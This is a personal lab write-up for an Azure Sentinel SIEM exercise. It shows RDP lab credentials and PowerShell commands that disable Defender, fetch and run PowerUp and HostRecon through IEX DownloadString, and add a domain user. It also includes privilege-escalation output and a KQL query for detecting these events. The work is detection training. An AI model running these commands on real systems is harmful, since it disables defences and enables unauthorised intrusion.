---
publish: true
---
# The Importance of a SIEM
- SIEMs (security and information event management "systems") are essential to handling security of IT assets, networks, and information at scale

# Overview of Sentinel
In this lab we will execute PowerShell commands and perform some recon on the workstation. We will ensure our logs are flowing to through Log Analytics and Sentinel. Familiarize yourself with the Azure Sentinel interface and create your first KQL query and Sentinel alert.

## Objectives
- Make sure environment is putting logs into Sentinel
- Look at KQL (Kusto Query Language)
- Create a Sentinel alert
## Methods
* Access the workstation VM via RDP  
* Execute PowerShell that we can hunt for in Sentinel  
* Generate a KQL query of a potential IOC  
* Generate a Sentinel Alert from the query.
# RDP into Workstation

Use below parameters to connect:

| Context  | Information     |
| -------- | --------------- |
| MSRDP    | 20.172.140.205  |
| Username | doazlab\DOAdmin |
| Password | DOLabAdmin1!    |

- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117223945342.png)
- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117224002264.png)
- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117224017961.png)
# Turn Off Defender/AV - for testing
By default, this lab has Defender operational and common malicious activity will be blocked.. For these next steps, lets first disable Defender:
```powershell
Set-MpPreference -ExclusionPath 'c:\users\doadmin'
Set-MpPreference -ExclusionProcess "powershell.exe", "cmd.exe"
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```
- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117224906772.png)
# Generate Suspicious Events with PowerUp
- First we will import a known attack tool "PowerUp". We will later ensure that Sentinel captured the Powershell invocations.
```powershell
Set-ExecutionPolicy bypass -force
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
invoke-allchecks
```
- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117225041789.png) 
- Output
```
PS C:\Users\doadmin> Set-ExecutionPolicy bypass -force
PS C:\Users\doadmin> Set-ExecutionPolicy bypass -force
PS C:\Users\doadmin> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
PS C:\Users\doadmin> invoke-allchecks

[*] Running Invoke-AllChecks
[+] Current user already has local administrative privileges!


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


ServiceName    : edgeupdate
Path           : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile : C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'edgeupdate'

ServiceName    : edgeupdatem
Path           : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile : C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'edgeupdatem'

ServiceName    : MicrosoftEdgeElevationService
Path           : "C:\Program Files (x86)\Microsoft\Edge\Application\96.0.1054.62\elevation_service.exe"
ModifiableFile : C:\Program Files (x86)\Microsoft\Edge\Application\96.0.1054.62\elevation_service.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'MicrosoftEdgeElevationService'




[*] Checking service permissions...

[.....SNIPPED....]

[*] Checking for vulnerable schtask files/configs...


TaskName     : MicrosoftEdgeUpdateTaskMachineCore
TaskFilePath : C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
TaskTrigger  : <Triggers xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><LogonTrigger><Enabled>true</Ena
              > bled></LogonTrigger><CalendarTrigger><StartBoundary>2022-01-02T20:38:39</StartBoundary><ScheduleByDay><D
              > aysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers
TaskName     : MicrosoftEdgeUpdateTaskMachineUA
TaskFilePath : C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
TaskTrigger  : <Triggers xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><CalendarTrigger><StartBoundary>
              > 2022-01-02T20:08:39</StartBoundary><Repetition><Interval>PT1H</Interval><Duration>P1D</Duration></Repeti
              > tion><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers>

[*] Checking for unattended install files...

UnattendPath : C:\Windows\Panther\Unattend.xml

[*] Checking for encrypted web.config strings...

[*] Checking for encrypted application pool and virtual directory passwords...

```

# Try Adding a Domain User
```powershell
net1 user appliedDemo apTclass! /add /domain 
```
- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117225446553.png)

# Domain Reconnaissance
- Recon activity is common with adversaries especially since they don't understand the environment like defenders typically do

We can utilize some native PS components to gain an understanding of the domain
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117225817755.png)

# Host Recon
- LOL = living of the land
- We can use some LOL binaries or components of PS to also do host recon

```powershell
Set-ExecutionPolicy bypass -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1') 
Invoke-HostRecon 
|Out-File recon.txt 
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230353006.png)

Results:
- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230456273.png)
- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230514241.png)
# First Look at Azure Sentinel
- Access the Azure Portal at Link: [https://portal.azure.com](https://portal.azure.com/).
- After login, Search "Sentinel" (2) and click on "Microsoft Sentinel" (3)
![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230830662.png)
![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230847678.png)

- No logs showing up in current Sentinel workspace? Switch to old overview
	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118134321536.png)
	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118134249419.png)
	- Switch to the old overview
		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192233137.png)
		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118134546595.png)

- If no logs show up
	- Navigate to portal.azure.com > Log Analytics Workspace > Virtual Machines and make sure they are connected to the workspace. If they do not show connected, do so now. Logs will start flowing promptly.
	- Says not connected, but only in deprecated feature?
		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192527785.png)
	- Shows as connected in "Agents"
		- #DO-TODO
		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192651277.png)
		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192942726.png)
	- Connecting them anyway
		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192748083.png)
# First KQL Analytics Query

- Azure > Sentinel > Logs
	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118193648396.png)
- Query for detecting the following events
	- [4688](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688): A new process has been created
	- 4103
	- 4104
	- 4105

```
union Event, SecurityEvent 
| where EventID in (4103, 4104, 4105, 4688) 
| where EventData contains "iex" or EventData contains "invoke" or EventData contains "import" or EventData contains "bypass" or EventData contains "git*" 
```
- Results
	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118195046657.png)
# KQL Query Result & GUI
- Lots of changes with Entra ID that also can affect Sentinel and KQL queries
	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118195659066.png)
- Below query didn't actually return any results
```
union Event, SecurityEvent 
| where EventID in (4103, 4104, 4105, 4688) 
| where EventData contains "iex" or EventData contains "invoke" or EventData contains "import" or EventData contains "bypass" or EventData contains "git*"
| limit 10
```

- I even tried running the suspicious activity in the workstation again

- [May 2023 - Difference between Log Analytics and Monitor - Microsoft Community Hub](https://techcommunity.microsoft.com/t5/azure-observability/difference-between-log-analytics-and-monitor/m-p/1290086)
	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118201916533.png)